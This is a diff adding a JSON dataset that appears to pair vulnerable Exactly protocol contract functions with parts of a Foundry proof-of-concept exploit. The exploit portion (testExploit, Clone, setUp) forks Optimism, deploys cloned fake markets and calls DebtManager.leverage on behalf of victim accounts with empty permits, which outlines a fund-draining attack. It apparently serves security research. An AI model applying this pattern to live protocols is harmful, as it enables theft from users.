@@ -1,0 +1,401 @@
+[
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "asset",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "auditor",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "borrowAtMaturity",
+    "original_code": "  function borrowAtMaturity(\n    uint256 maturity,\n    uint256 assets,\n    uint256 maxAssets,\n    address receiver,\n    address borrower\n  ) external whenNotPaused returns (uint256 assetsOwed) {\n    // reverts on failure\n    FixedLib.checkPoolState(maturity, maxFuturePools, FixedLib.State.VALID, FixedLib.State.NONE);\n\n    FixedLib.Pool storage pool = fixedPools[maturity];\n\n    uint256 backupEarnings = pool.accrueEarnings(maturity);\n\n    uint256 fee = assets.mulWadDown(\n      interestRateModel.fixedBorrowRate(maturity, assets, pool.borrowed, pool.supplied, previewFloatingAssetsAverage())\n    );\n    assetsOwed = assets + fee;\n\n    // validate that the account is not taking arbitrary fees\n    if (assetsOwed > maxAssets) revert Disagreement();\n\n    spendAllowance(borrower, assetsOwed);\n\n    {\n      uint256 backupDebtAddition = pool.borrow(assets);\n      if (backupDebtAddition > 0) {\n        uint256 newFloatingBackupBorrowed = floatingBackupBorrowed + backupDebtAddition;\n        depositToTreasury(updateFloatingDebt());\n        if (newFloatingBackupBorrowed + floatingDebt > floatingAssets.mulWadDown(1e18 - reserveFactor)) {\n          revert InsufficientProtocolLiquidity();\n        }\n        floatingBackupBorrowed = newFloatingBackupBorrowed;\n      }\n    }\n\n    {\n      // if account doesn't have a current position, add it to the list\n      FixedLib.Position storage position = fixedBorrowPositions[maturity][borrower];\n      if (position.principal == 0) {\n        Account storage account = accounts[borrower];\n        account.fixedBorrows = account.fixedBorrows.setMaturity(maturity);\n      }\n\n      // calculate what portion of the fees are to be accrued and what portion goes to earnings accumulator\n      (uint256 newUnassignedEarnings, uint256 newBackupEarnings) = pool.distributeEarnings(\n        chargeTreasuryFee(fee),\n        assets\n      );\n      if (newUnassignedEarnings > 0) pool.unassignedEarnings += newUnassignedEarnings;\n      collectFreeLunch(newBackupEarnings);\n\n      fixedBorrowPositions[maturity][borrower] = FixedLib.Position(position.principal + assets, position.fee + fee);\n    }\n\n    floatingAssets += backupEarnings;\n\n    emit BorrowAtMaturity(maturity, msg.sender, receiver, borrower, assets, fee);\n    emitMarketUpdate();\n    emitFixedEarningsUpdate(maturity);\n\n    auditor.checkBorrow(this, borrower);\n    asset.safeTransfer(receiver, assets);\n  }\n\n  /// @notice Withdraws a certain amount from a maturity.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "convertToAssets",
+    "original_code": "    function convertToAssets(uint256 shares) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "convertToShares",
+    "original_code": "    function convertToShares(uint256 assets) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals() public view virtual returns (uint8) {\n        return _decimals;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "  function deposit(Pool storage pool, uint256 amount) internal returns (uint256 backupDebtReduction) {\n    uint256 borrowed = pool.borrowed;\n    uint256 supplied = pool.supplied;\n    pool.supplied = supplied + amount;\n    backupDebtReduction = Math.min(borrowed - Math.min(borrowed, supplied), amount);\n  }\n\n  /// @notice Registers an operation to reduce borrowed amount from a fixed rate pool\n  /// and potentially reduce backup debt.\n  /// @param pool fixed rate pool where an amount will be repaid.\n  /// @param amount amount to be added to the fixed rate pool.\n  /// @return backupDebtReduction amount that will be reduced from the backup debt.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "liquidate",
+    "original_code": "  function liquidate(\n    address borrower,\n    uint256 maxAssets,\n    Market seizeMarket\n  ) external whenNotPaused returns (uint256 repaidAssets) {\n    if (msg.sender == borrower) revert SelfLiquidation();\n\n    maxAssets = auditor.checkLiquidation(this, seizeMarket, borrower, maxAssets);\n    if (maxAssets == 0) revert ZeroRepay();\n\n    Account storage account = accounts[borrower];\n\n    {\n      uint256 packedMaturities = account.fixedBorrows;\n      uint256 maturity = packedMaturities & ((1 << 32) - 1);\n      packedMaturities = packedMaturities >> 32;\n      while (packedMaturities != 0 && maxAssets != 0) {\n        if (packedMaturities & 1 != 0) {\n          uint256 actualRepay;\n          if (block.timestamp < maturity) {\n            actualRepay = noTransferRepayAtMaturity(maturity, maxAssets, maxAssets, borrower, false);\n            maxAssets -= actualRepay;\n          } else {\n            uint256 position;\n            {\n              FixedLib.Position storage p = fixedBorrowPositions[maturity][borrower];\n              position = p.principal + p.fee;\n            }\n            uint256 debt = position + position.mulWadDown((block.timestamp - maturity) * penaltyRate);\n            actualRepay = debt > maxAssets ? maxAssets.mulDivDown(position, debt) : maxAssets;\n\n            if (actualRepay == 0) maxAssets = 0;\n            else {\n              actualRepay = noTransferRepayAtMaturity(maturity, actualRepay, maxAssets, borrower, false);\n              maxAssets -= actualRepay;\n            }\n          }\n          repaidAssets += actualRepay;\n        }\n        packedMaturities >>= 1;\n        maturity += FixedLib.INTERVAL;\n      }\n    }\n\n    if (maxAssets > 0 && account.floatingBorrowShares > 0) {\n      uint256 borrowShares = previewRepay(maxAssets);\n      if (borrowShares > 0) {\n        (uint256 actualRepayAssets, ) = noTransferRefund(borrowShares, borrower);\n        repaidAssets += actualRepayAssets;\n      }\n    }\n\n    // reverts on failure\n    (uint256 lendersAssets, uint256 seizeAssets) = auditor.calculateSeize(this, seizeMarket, borrower, repaidAssets);\n    earningsAccumulator += lendersAssets;\n\n    if (address(seizeMarket) == address(this)) {\n      internalSeize(this, msg.sender, borrower, seizeAssets);\n    } else {\n      seizeMarket.seize(msg.sender, borrower, seizeAssets);\n\n      emitMarketUpdate();\n    }\n\n    emit Liquidate(msg.sender, borrower, repaidAssets, lendersAssets, seizeMarket, seizeAssets);\n\n    auditor.handleBadDebt(borrower);\n\n    asset.safeTransferFrom(msg.sender, address(this), repaidAssets + lendersAssets);\n  }\n\n  /// @notice Clears floating and fixed debt for an account spreading the losses to the `earningsAccumulator`.\n  /// @dev Can only be called from the auditor.\n  /// @param borrower account with insufficient collateral to be cleared the debt.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "maxDeposit",
+    "original_code": "    function maxDeposit(address) public view virtual returns (uint256) {\n        return type(uint256).max;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "maxMint",
+    "original_code": "    function maxMint(address) public view virtual returns (uint256) {\n        return type(uint256).max;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "maxRedeem",
+    "original_code": "    function maxRedeem(address owner) public view virtual returns (uint256) {\n        return balanceOf[owner];\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                          INTERNAL HOOKS LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "maxWithdraw",
+    "original_code": "    function maxWithdraw(address owner) public view virtual returns (uint256) {\n        return convertToAssets(balanceOf[owner]);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "mint",
+    "original_code": "    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Collects tokens owed to a position\n    /// @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n    /// Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n    /// amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n    /// actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n    /// @param recipient The address which should receive the fees collected\n    /// @param tickLower The lower tick of the position for which to collect fees\n    /// @param tickUpper The upper tick of the position for which to collect fees\n    /// @param amount0Requested How much token0 should be withdrawn from the fees owed\n    /// @param amount1Requested How much token1 should be withdrawn from the fees owed\n    /// @return amount0 The amount of fees collected in token0\n    /// @return amount1 The amount of fees collected in token1\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "    function owner() external view returns (address) {\n        return _owner;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "previewDeposit",
+    "original_code": "    function previewDeposit(uint256 assets) public view virtual returns (uint256) {\n        return convertToShares(assets);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "previewMint",
+    "original_code": "    function previewMint(uint256 shares) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? shares : shares.mulDivUp(totalAssets(), supply);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "previewRedeem",
+    "original_code": "    function previewRedeem(uint256 shares) public view virtual returns (uint256) {\n        return convertToAssets(shares);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                     DEPOSIT/WITHDRAWAL LIMIT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "previewWithdraw",
+    "original_code": "    function previewWithdraw(uint256 assets) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivUp(supply, totalAssets());\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "redeem",
+    "original_code": "  function redeem(\n    uint256 shares,\n    address receiver,\n    address owner\n  ) public override returns (uint256 assets) {\n    auditor.checkShortfall(this, owner, previewRedeem(shares));\n    assets = super.redeem(shares, receiver, owner);\n    emitMarketUpdate();\n  }\n\n  /// @notice Moves amount of shares from the caller's account to `to`.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "repayAtMaturity",
+    "original_code": "  function repayAtMaturity(\n    uint256 maturity,\n    uint256 positionAssets,\n    uint256 maxAssets,\n    address borrower\n  ) external whenNotPaused returns (uint256 actualRepayAssets) {\n    // reverts on failure\n    FixedLib.checkPoolState(maturity, maxFuturePools, FixedLib.State.VALID, FixedLib.State.MATURED);\n\n    actualRepayAssets = noTransferRepayAtMaturity(maturity, positionAssets, maxAssets, borrower, true);\n    emitMarketUpdate();\n\n    asset.safeTransferFrom(msg.sender, address(this), actualRepayAssets);\n  }\n\n  /// @notice Allows to (partially) repay a fixed rate position. It does not transfer assets.\n  /// @param maturity the maturity to access the pool.\n  /// @param positionAssets the amount of debt of the pool that should be paid.\n  /// @param maxAssets maximum amount of debt that the account is willing to accept to be repaid.\n  /// @param borrower the address of the account that has the debt.\n  /// @param canDiscount should early repay discounts be applied.\n  /// @return actualRepayAssets the actual amount that should be transferred into the protocol.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "totalAssets",
+    "original_code": "  function totalAssets() public view override returns (uint256) {\n    unchecked {\n      uint256 memMaxFuturePools = maxFuturePools;\n      uint256 backupEarnings = 0;\n\n      uint256 latestMaturity = block.timestamp - (block.timestamp % FixedLib.INTERVAL);\n      uint256 maxMaturity = latestMaturity + memMaxFuturePools * FixedLib.INTERVAL;\n\n      for (uint256 maturity = latestMaturity; maturity <= maxMaturity; maturity += FixedLib.INTERVAL) {\n        FixedLib.Pool storage pool = fixedPools[maturity];\n        uint256 lastAccrual = pool.lastAccrual;\n\n        if (maturity > lastAccrual) {\n          backupEarnings += block.timestamp < maturity\n            ? pool.unassignedEarnings.mulDivDown(block.timestamp - lastAccrual, maturity - lastAccrual)\n            : pool.unassignedEarnings;\n        }\n      }\n\n      return\n        floatingAssets +\n        backupEarnings +\n        accumulatedEarnings() +\n        (totalFloatingBorrowAssets() - floatingDebt).mulWadDown(1e18 - treasuryFeeRate);\n    }\n  }\n\n  /// @notice Simulates the effects of a borrow at the current time, given current contract conditions.\n  /// @param assets amount of assets to borrow.\n  /// @return amount of shares that will be asigned to the account after the borrow.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IexaUSDC",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "  function withdraw(\n    uint256 assets,\n    address receiver,\n    address owner\n  ) public override returns (uint256 shares) {\n    auditor.checkShortfall(this, owner, assets);\n    shares = super.withdraw(assets, receiver, owner);\n    emitMarketUpdate();\n  }\n\n  /// @notice Redeems the owner's floating pool assets to the receiver address.\n  /// @dev Makes sure that the owner doesn't have shortfall after withdrawing.\n  /// @param shares amount of shares to be redeemed for underlying asset.\n  /// @param receiver address to which the assets will be transferred.\n  /// @param owner address which owns the floating pool assets.\n  /// @return assets amount of underlying asset that was withdrawn.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FakeMarket",
+    "source_type": "victim_contract",
+    "function_name": "accounts",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "FakeMarket",
+    "source_type": "victim_contract",
+    "function_name": "burn",
+    "original_code": "    function burn(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Swap token0 for token1, or token1 for token0\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\n    /// @param recipient The address to receive the output of the swap\n    /// @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0\n    /// @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\n    /// @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this\n    /// value after the swap. If one for zero, the price cannot be greater than this value after the swap\n    /// @param data Any data to be passed through to the callback\n    /// @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive\n    /// @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FakeMarket",
+    "source_type": "victim_contract",
+    "function_name": "init",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "FakeMarket",
+    "source_type": "victim_contract",
+    "function_name": "nonces",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "FakeMarket",
+    "source_type": "victim_contract",
+    "function_name": "permit",
+    "original_code": "    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline >= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        // Unchecked because the only math done is incrementing\n        // the owner's nonce which cannot realistically overflow.\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n\n            require(recoveredAddress != address(0) && recoveredAddress == owner, \"INVALID_SIGNER\");\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FakeMarket",
+    "source_type": "victim_contract",
+    "function_name": "previewRefund",
+    "original_code": "  function previewRefund(uint256 shares) public view returns (uint256) {\n    uint256 supply = totalFloatingBorrowShares; // Saves an extra SLOAD if totalFloatingBorrowShares is non-zero.\n\n    return supply == 0 ? shares : shares.mulDivUp(totalFloatingBorrowAssets(), supply);\n  }\n\n  /// @notice Checks msg.sender's allowance over account's assets.\n  /// @param account account in which the allowance will be checked.\n  /// @param assets assets from account that msg.sender wants to operate on.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FakeMarket",
+    "source_type": "victim_contract",
+    "function_name": "repay",
+    "original_code": "  function repay(uint256 assets, address borrower)\n    external\n    whenNotPaused\n    returns (uint256 actualRepay, uint256 borrowShares)\n  {\n    (actualRepay, borrowShares) = noTransferRefund(previewRepay(assets), borrower);\n    emitMarketUpdate();\n    asset.safeTransferFrom(msg.sender, address(this), actualRepay);\n  }\n\n  /// @notice Repays a certain amount of shares to the floating pool.\n  /// @param borrowShares shares to be subtracted from the borrower's accountability.\n  /// @param borrower address of the account that has the debt.\n  /// @return assets subtracted assets from the borrower's accountability.\n  /// @return actualShares actual subtracted shares from the borrower's accountability.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "FakeMarket",
+    "source_type": "victim_contract",
+    "function_name": "setVictim",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "Clone",
+    "original_code": "    function Clone(\n        address target\n    ) public returns (address result) {\n        bytes20 targetBytes = bytes20(target);\n        assembly {\n            let clone := mload(0x40)\n            mstore(clone, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)\n            mstore(add(clone, 0x14), targetBytes)\n            mstore(add(clone, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000)\n            result := create(0, clone, 0x37)\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"optimism\", 108_375_557);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(exaUSDC), \"exaUSDC\");\n        vm.label(address(UNIV3NFTManager), \"UNIV3NFTManager\");\n        vm.label(address(DebtManager), \"DebtManager\");\n        vm.label(address(Auditor), \"Auditor\");\n        vm.label(address(USDCPirceFeed), \"USDCPirceFeed\");\n        vm.label(address(exaUSDC), \"exaUSDC\");\n        vm.label(address(Quoter), \"Quoter\");\n    }\n\n    // https://solidity-by-example.org/app/minimal-proxy/\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() external {\n        fakeMarket = new FakeMarket();\n        for (uint256 i; i < 16; ++i) {\n            address miniProxy = Clone(address(fakeMarket)); // create fake market\n            fakeMarketList.push(FakeMarket(miniProxy));\n            FakeMarket(miniProxy).init(\n                address(UNIV3NFTManager),\n                address(Auditor),\n                address(DebtManager),\n                address(exaUSDC),\n                address(Quoter),\n                address(USDC),\n                address(USDCPirceFeed),\n                1_000_000\n            );\n        }\n\n        USDC.approve(address(exaUSDC), type(uint256).max);\n\n        for (uint256 i; i < 8; ++i) {\n            fakeMarketList[i].setVictim(victimList[i]);\n            // @note https://github.com/exactly/protocol/blob/main/contracts/periphery/DebtManager.sol#L762-L792\n            DebtManager.leverage(\n                address(fakeMarketList[i]),\n                0,\n                0,\n                0,\n                IDebtManager.Permit({account: address(victimList[i]), deadline: 0, v: 0, r: bytes32(0), s: bytes32(0)})\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IDebtManager",
+    "source_type": "victim_contract",
+    "function_name": "crossDeleverage",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IDebtManager",
+    "source_type": "victim_contract",
+    "function_name": "leverage",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IAuditor",
+    "source_type": "victim_contract",
+    "function_name": "accountLiquidity",
+    "original_code": "  function accountLiquidity(\n    address account,\n    Market marketToSimulate,\n    uint256 withdrawAmount\n  ) public view returns (uint256 sumCollateral, uint256 sumDebtPlusEffects) {\n    AccountLiquidity memory vars; // holds all our calculation results\n\n    // for each asset the account is in\n    uint256 marketMap = accountMarkets[account];\n    for (uint256 i = 0; marketMap != 0; marketMap >>= 1) {\n      if (marketMap & 1 != 0) {\n        Market market = marketList[i];\n        MarketData storage m = markets[market];\n        uint256 baseUnit = 10**m.decimals;\n        uint256 adjustFactor = m.adjustFactor;\n\n        // read the balances\n        (vars.balance, vars.borrowBalance) = market.accountSnapshot(account);\n\n        // get the normalized price of the asset (18 decimals)\n        vars.price = assetPrice(m.priceFeed);\n\n        // sum all the collateral prices\n        sumCollateral += vars.balance.mulDivDown(vars.price, baseUnit).mulWadDown(adjustFactor);\n\n        // sum all the debt\n        sumDebtPlusEffects += vars.borrowBalance.mulDivUp(vars.price, baseUnit).divWadUp(adjustFactor);\n\n        // simulate the effects of withdrawing from a pool\n        if (market == marketToSimulate) {\n          // calculate the effects of redeeming markets\n          // (having less collateral is the same as having more debt for this calculation)\n          if (withdrawAmount != 0) {\n            sumDebtPlusEffects += withdrawAmount.mulDivDown(vars.price, baseUnit).mulWadDown(adjustFactor);\n          }\n        }\n      }\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /// @notice Validates that the current state of the position and system are valid.\n  /// @dev To be called after adding the borrowed debt to the account position.\n  /// @param market address of the market where the borrow is made.\n  /// @param borrower address of the account that will repay the debt.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IAuditor",
+    "source_type": "victim_contract",
+    "function_name": "assetPrice",
+    "original_code": "  function assetPrice(IPriceFeed priceFeed) public view returns (uint256) {\n    if (address(priceFeed) == BASE_FEED) return basePrice;\n\n    int256 price = priceFeed.latestAnswer();\n    if (price <= 0) revert InvalidPrice();\n    return uint256(price) * baseFactor;\n  }\n\n  /// @notice Retrieves all markets.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IAuditor",
+    "source_type": "victim_contract",
+    "function_name": "markets",
+    "original_code": "",
+    "description": ""
+  }
+]
